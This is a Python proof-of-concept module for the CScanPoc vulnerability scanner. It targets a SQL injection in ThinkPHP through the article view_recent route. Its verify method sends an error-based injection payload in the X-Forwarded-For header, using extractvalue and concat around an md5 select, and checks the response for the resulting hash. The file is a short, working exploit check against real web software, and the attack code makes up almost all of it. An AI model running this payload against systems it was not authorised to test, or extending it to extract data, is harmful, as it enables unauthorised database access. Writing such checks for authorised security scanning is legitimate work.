# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    poc_id = 'adbd6228-aa93-4bc6-b1b8-755725609dfb'
    name = 'ThinkPHP SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        ThinkPHP index.php?s=/home/article/view_recent/name/1 参数过滤不严谨，导致SQL注入漏洞。 
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd8765219-26aa-411e-922d-c6e72b4a23b7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            poc = self.target + '/index.php?s=/home/article/view_recent/name/1'
            header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"
            code, head, res, errcode, _ = hh.http(poc, header=header)

            if code == 200 and 'e165421110ba03099a1c0393373c5b4' in res:
                #security_hole("X-Forwarded-For SQLI:"+poc)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
